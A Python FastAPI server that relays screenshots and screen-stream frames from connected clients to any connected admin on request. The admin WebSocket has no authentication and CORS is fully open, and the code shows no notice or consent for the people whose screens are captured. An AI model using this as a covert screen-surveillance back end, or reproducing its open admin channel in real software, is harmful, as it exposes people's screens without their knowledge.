from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict
import random
import json
import asyncio

app = FastAPI()

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients: Dict[str, WebSocket] = {}
admins: list[WebSocket] = []

def generate_client_id():
    """Generate a unique 4-digit ID"""
    while True:
        client_id = f"{random.randint(1000, 9999)}"
        if client_id not in clients:
            return client_id

@app.get("/")
async def root():
    return {"status": "Server is running", "clients": len(clients), "admins": len(admins)}

@app.get("/clients")
async def get_clients():
    return {"clients": list(clients.keys())}

# =========================
# CLIENT CONNECT
# =========================
@app.websocket("/ws/client")
async def client_ws(websocket: WebSocket):
    client_id = None
    try:
        await websocket.accept()
        print(f"🔌 Client connection accepted from {websocket.client}")
        
        # Generate unique ID for client
        client_id = generate_client_id()
        clients[client_id] = websocket
        
        # Send ID to client
        await websocket.send_json({
            "type": "id_assigned",
            "client_id": client_id
        })
        
        print(f"✅ Client {client_id} connected")
        
        # Notify all admins about new client
        await broadcast_client_list()
        
        # Main message loop
        while True:
            try:
                # Receive data with timeout
                data = await asyncio.wait_for(websocket.receive_text(), timeout=90.0)
                
                # Handle ping
                if data == "ping":
                    await websocket.send_text("pong")
                    continue
                
                # Forward image to admins
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": data
                })
                
            except asyncio.TimeoutError:
                # Send ping to keep connection alive
                try:
                    await websocket.send_text("ping")
                except:
                    print(f"⚠️ Failed to ping client {client_id}")
                    break

    except WebSocketDisconnect:
        print(f"❌ Client {client_id} disconnected normally")
    except Exception as e:
        print(f"⚠️ Client {client_id} error: {type(e).__name__}: {e}")
    finally:
        if client_id:
            clients.pop(client_id, None)
            print(f"🧹 Cleaned up client {client_id}")
            await broadcast_client_list()


# =========================
# ADMIN CONNECT
# =========================
@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    try:
        await websocket.accept()
        admins.append(websocket)
        print(f"👤 Admin connected from {websocket.client}")
        
        # Send current client list
        await websocket.send_json({
            "type": "client_list",
            "clients": list(clients.keys())
        })
        
        # Main message loop
        while True:
            try:
                # Receive data with timeout
                data = await asyncio.wait_for(websocket.receive_json(), timeout=90.0)

                # Handle screenshot request
                if data.get("action") == "take_photo":
                    client_id = data.get("client_id")
                    if client_id in clients:
                        try:
                            await clients[client_id].send_text("take_photo")
                            print(f"📸 Screenshot requested for client {client_id}")
                        except Exception as e:
                            print(f"⚠️ Failed to send screenshot request: {e}")
                
                # Handle stream request
                elif data.get("action") == "stream_frame":
                    client_id = data.get("client_id")
                    quality = data.get("quality", "medium")
                    if client_id in clients:
                        try:
                            await clients[client_id].send_json({
                                "action": "stream_frame",
                                "quality": quality
                            })
                        except Exception as e:
                            print(f"⚠️ Failed to send stream request: {e}")
                            
            except asyncio.TimeoutError:
                # Send ping to keep connection alive
                try:
                    await websocket.send_json({"type": "ping"})
                except:
                    print("⚠️ Failed to ping admin")
                    break

    except WebSocketDisconnect:
        print("👤 Admin disconnected normally")
    except Exception as e:
        print(f"⚠️ Admin error: {type(e).__name__}: {e}")
    finally:
        if websocket in admins:
            admins.remove(websocket)
        print("🧹 Cleaned up admin connection")


# =========================
# HELPER FUNCTIONS
# =========================
async def broadcast_client_list():
    """Broadcast updated client list to all admins"""
    message = {
        "type": "client_list",
        "clients": list(clients.keys())
    }
    
    disconnected_admins = []
    for admin in admins:
        try:
            await admin.send_json(message)
        except:
            disconnected_admins.append(admin)
    
    # Clean up disconnected admins
    for admin in disconnected_admins:
        if admin in admins:
            admins.remove(admin)

async def broadcast_to_admins(message):
    """Broadcast message to all admins"""
    disconnected_admins = []
    for admin in admins:
        try:
            await admin.send_json(message)
        except:
            disconnected_admins.append(admin)
    
    # Clean up disconnected admins
    for admin in disconnected_admins:
        if admin in admins:
            admins.remove(admin)
